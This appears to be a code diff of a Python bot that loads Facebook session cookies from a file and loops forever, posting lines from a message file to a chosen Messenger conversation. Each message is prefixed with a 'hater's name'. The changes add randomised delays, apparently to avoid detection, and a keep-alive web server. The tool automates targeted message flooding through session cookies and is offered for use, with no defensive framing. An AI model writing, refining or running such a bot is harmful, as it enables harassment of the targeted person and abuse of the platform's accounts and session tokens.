@@ -18,7 +18,7 @@ class MyHandler(http.server.SimpleHTTPRequestHandler):
         self.wfile.write(b"Server is Running")
 
 def execute_server():
-    PORT = 4000
+    PORT = int(os.getenv('PORT', 4000))
     with socketserver.TCPServer(("", PORT), MyHandler) as httpd:
         print(f"Server running at http://localhost:{PORT}")
         httpd.serve_forever()
@@ -26,28 +26,23 @@ def execute_server():
 def get_fb_cookies():
     try:
         with open('cookies.txt', 'r') as file:
-            cookies_content = file.read()
-        
-        # Extract required cookies
-        c_user = re.search(r'c_user=(\d+)', cookies_content)
-        xs = re.search(r'xs=([^;]+)', cookies_content)
-        fr = re.search(r'fr=([^;]+)', cookies_content)
-        datr = re.search(r'datr=([^;]+)', cookies_content)
-        
-        if not c_user or not xs:
-            print("[-] Required cookies (c_user and xs) not found!")
-            return None
+            cookies_content = file.read().strip().strip('[]')
+            cookies = {}
             
-        cookies = {
-            'c_user': c_user.group(1),
-            'xs': xs.group(1),
-            'fr': fr.group(1) if fr else '',
-            'datr': datr.group(1) if datr else ''
-        }
-        return cookies
-        
+            for part in cookies_content.split(';'):
+                part = part.strip()
+                if '=' in part:
+                    key, value = part.split('=', 1)
+                    cookies[key.strip()] = value.strip()
+            
+            print(f"[DEBUG] Parsed Cookies: {list(cookies.keys())}")
+            if not all(k in cookies for k in ['c_user', 'xs']):
+                print("[ERROR] Missing required cookies (c_user or xs)")
+                return None
+            return cookies
+            
     except Exception as e:
-        print(f"[-] Error reading cookies: {e}")
+        print(f"[ERROR] Cookie parsing failed: {str(e)}")
         return None
 
 def send_message_with_cookies(cookies, convo_id, message):
@@ -58,93 +53,82 @@ def send_message_with_cookies(cookies, convo_id, message):
         'content-type': 'application/x-www-form-urlencoded',
         'origin': 'https://www.facebook.com',
         'referer': f'https://www.facebook.com/messages/t/{convo_id}',
-        'sec-ch-ua': '"Chromium";v="116", "Not)A;Brand";v="24"',
-        'sec-ch-ua-mobile': '?0',
-        'sec-ch-ua-platform': '"Windows"',
-        'sec-fetch-dest': 'empty',
-        'sec-fetch-mode': 'cors',
-        'sec-fetch-site': 'same-origin',
-        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36',
-        'x-requested-with': 'XMLHttpRequest'
+        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36'
     }
     
-    # First get fb_dtsg token
     session = requests.Session()
     for name, value in cookies.items():
-        if value:  # Only add cookie if it has a value
-            session.cookies.set(name, value)
+        session.cookies.set(name, value)
     
     try:
-        # Load messenger page to get required tokens
+        print(f"[DEBUG] Loading conversation page...")
         res = session.get(f'https://www.facebook.com/messages/t/{convo_id}', headers=headers)
-        fb_dtsg = re.search(r'"token":"(.*?)"', res.text)
-        jazoest = re.search(r'&jazoest=(\d+)', res.text)
+        
+        fb_dtsg = re.search(r'"token":"([^"]+)"', res.text)
+        jazoest = re.search(r'jazoest=(\d+)', res.text)
         
         if not fb_dtsg or not jazoest:
-            print("[-] Could not extract required tokens from page")
+            print("[ERROR] Could not extract required tokens from page")
             return False
             
-        # Prepare form data
+        print(f"[DEBUG] Tokens extracted successfully")
+        
         form_data = {
             'fb_dtsg': fb_dtsg.group(1),
             'jazoest': jazoest.group(1),
             'body': message,
             'send': 'Send',
             'tids': f'cid.{convo_id}',
-            'wwwupp': 'C3',
-            'platform': 'web',
-            'source': 'messages_web_basic',
             '__user': cookies['c_user']
         }
         
-        # Send message
         response = session.post('https://www.facebook.com/messages/send/', data=form_data, headers=headers)
+        print(f"[DEBUG] Facebook response status: {response.status_code}")
         return response.ok
         
     except Exception as e:
-        print(f"[!] Error sending message: {e}")
+        print(f"[ERROR] Message sending failed: {str(e)}")
         return False
 
 def send_messages():
-    # Get cookies from file
+    print("[+] Starting message sender...")
+    
     cookies = get_fb_cookies()
     if not cookies:
-        sys.exit()
+        print("[ERROR] Invalid cookies - stopping")
+        return
     
-    # Read conversation ID
     try:
         with open('convo.txt', 'r') as file:
             convo_id = file.read().strip()
-    except:
-        print("[-] Error reading convo.txt")
-        sys.exit()
+            print(f"[DEBUG] Conversation ID: {convo_id}")
+    except Exception as e:
+        print(f"[ERROR] Reading convo.txt: {str(e)}")
+        return
     
-    # Read messages file
     try:
         with open('file.txt', 'r') as file:
             text_file_path = file.read().strip()
         with open(text_file_path, 'r') as file:
             messages = [line.strip() for line in file.readlines() if line.strip()]
-    except:
-        print("[-] Error reading messages file")
-        sys.exit()
+            print(f"[DEBUG] Loaded {len(messages)} messages")
+    except Exception as e:
+        print(f"[ERROR] Reading messages: {str(e)}")
+        return
     
-    # Read hater's name
     try:
         with open('hatersname.txt', 'r') as file:
             haters_name = file.read().strip()
     except:
         haters_name = ""
     
-    # Read delay time
     try:
         with open('time.txt', 'r') as file:
             speed = int(file.read().strip())
     except:
         speed = 5
     
-    print("[+] Starting message sending...")
-    
+    print("[+] Starting message loop...")
     while True:
         try:
             for i, message in enumerate(messages):
@@ -152,23 +136,21 @@ def send_messages():
                 current_time = time.strftime("%Y-%m-%d %I:%M:%S %p")
                 
                 if send_message_with_cookies(cookies, convo_id, full_message):
-                    print(f"[+] Message {i+1} sent successfully | {current_time}")
+                    print(f"[+] Message {i+1}/{len(messages)} sent | {current_time}")
                 else:
                     print(f"[-] Failed to send message {i+1} | {current_time}")
                 
-                time.sleep(speed)
+                time.sleep(speed + random.uniform(-1, 1))  # Randomize delay
             
-            print("[+] All messages sent. Restarting...")
-            
+            print("[+] Message cycle completed. Restarting...")
         except Exception as e:
-            print(f"[!] Error: {e}")
-            time.sleep(30)  # Wait before retrying
+            print(f"[!] Critical error: {str(e)}")
+            time.sleep(30)
 
 def main():
-    server_thread = threading.Thread(target=execute_server)
-    server_thread.daemon = True
+    print("[+] Starting server and message sender...")
+    server_thread = threading.Thread(target=execute_server, daemon=True)
     server_thread.start()
-    
     send_messages()
 
 if __name__ == '__main__':
